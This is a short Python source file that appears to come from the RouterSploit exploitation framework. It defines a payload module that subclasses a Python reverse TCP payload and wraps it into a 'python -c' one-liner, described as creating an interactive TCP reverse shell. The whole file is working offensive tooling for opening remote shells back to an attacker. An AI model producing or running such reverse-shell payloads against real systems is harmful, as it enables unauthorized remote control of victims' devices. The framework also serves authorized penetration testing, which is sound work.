from routersploit.core.exploit import *
from routersploit.modules.payloads.python.reverse_tcp import Exploit as PythonReverseTCP


class Exploit(PythonReverseTCP):
    __info__ = {
        "name": "Python Reverse TCP One-Liner",
        "description": "Creates interactive tcp reverse shell by using python one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>"  # routersploit module
        ),
    }

    cmd = OptString("python", "Python binary")

    def generate(self):
        payload = super(Exploit, self).generate()

        cmd = '{} -c "{}"'.format(self.cmd, payload)
        return cmd
